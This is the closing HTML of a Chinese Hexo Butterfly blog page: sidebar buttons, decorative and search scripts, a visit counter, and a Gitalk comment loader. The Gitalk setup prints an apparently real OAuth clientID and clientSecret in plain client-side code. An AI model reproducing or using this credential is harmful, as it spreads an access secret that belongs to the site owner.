fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: 'fe8dfe66cc01b0567d44',
      clientSecret: '68188c5d5426523e7e34480cc1ceb47b2bb9830f',
      repo: 'carpet',
      owner: 'cyberikun',
      admin: ['cyberikun'],
      id: 'bf47e52340b3200dc0f096d4661316fd',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
    getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.textContent= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>